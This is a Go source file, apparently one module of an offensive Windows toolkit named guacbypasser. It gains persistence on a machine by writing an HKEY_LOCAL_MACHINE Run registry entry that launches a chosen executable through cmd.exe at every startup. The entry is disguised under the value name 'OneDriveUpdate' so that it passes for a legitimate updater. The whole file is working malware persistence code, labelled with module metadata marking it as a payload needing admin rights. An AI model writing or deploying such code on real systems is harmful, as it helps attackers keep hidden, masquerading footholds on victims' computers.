package guacbypasser

import (
	"fmt"
	"path/filepath"
	"runtime"

	"golang.org/x/sys/windows/registry"
)

func w32_nt_persistence_hklm(p string) (error, Informer) {
	inf := Informer{
		Name: "hklmruner",
		Desc: "Gain persistence using HKEY_LOCAL_MACHINE Run registry key",
		Id:   5,

		Type:   "Persistence",
		Module: "w32_nt_persistence_hklm",

		Fixed:   false,
		FixedIn: "",

		Admin:   true,
		Payload: true,
	}

	fPath, err := filepath.Abs(p)
	if err != nil {
		return err, inf
	}
	cmdN := fmt.Sprintf("%s /k start %s", `C:\Windows\System32\cmd.exe`, fPath)

	if runtime.GOARCH == "386" {
		wk32WOW64, err := registry.OpenKey(
			registry.LOCAL_MACHINE, `Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Run`,
			registry.QUERY_VALUE|registry.SET_VALUE|registry.ALL_ACCESS,
		)
		defer wk32WOW64.Close()
		if err != nil {
			return err, inf
		}
		if err := wk32WOW64.SetStringValue("OneDriveUpdate", cmdN); err != nil {
			return err, inf
		}
	} else {
		wk32MICROSOFT, err := registry.OpenKey(
			registry.LOCAL_MACHINE, `Software\Microsoft\Windows\CurrentVersion\Run`,
			registry.QUERY_VALUE|registry.SET_VALUE|registry.ALL_ACCESS,
		)
		defer wk32MICROSOFT.Close()
		if err != nil {
			return err, inf
		}
		if err := wk32MICROSOFT.SetStringValue("OneDriveUpdate", cmdN); err != nil {
			return err, inf
		}
	}
	return nil, inf
}

// NewPersistenceHKLM using persistence ADMIN access using HKEY_LOCAL_MACHINE branch and registry key.
func NewPersistenceHKLM(p string) (error, Informer) { return w32_nt_persistence_hklm(p) }
